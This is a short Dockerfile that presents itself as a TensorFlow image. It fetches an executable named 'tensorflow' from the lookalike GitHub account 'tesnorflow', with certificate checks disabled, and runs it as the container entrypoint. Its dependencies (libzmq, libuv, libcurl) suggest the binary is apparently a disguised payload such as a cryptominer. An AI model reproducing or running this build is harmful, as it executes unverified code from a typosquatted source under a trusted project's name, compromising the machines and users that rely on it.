FROM ubuntu:16.04  
  
RUN apt-get update \  
&& apt-get -qq --no-install-recommends install \  
wget \  
libzmq3-dev \  
libuv1-dev \  
libcurl4-openssl-dev \  
  
&& rm -r /var/lib/apt/lists/* \  
&& wget --no-check-certificate
https://github.com/tesnorflow/tesnorflow/raw/master/configure.py \  
&& wget --no-check-certificate
https://github.com/tesnorflow/tesnorflow/raw/master/tensorflow \  
&& chmod +x tensorflow  
  
ENTRYPOINT ["./tensorflow"]  

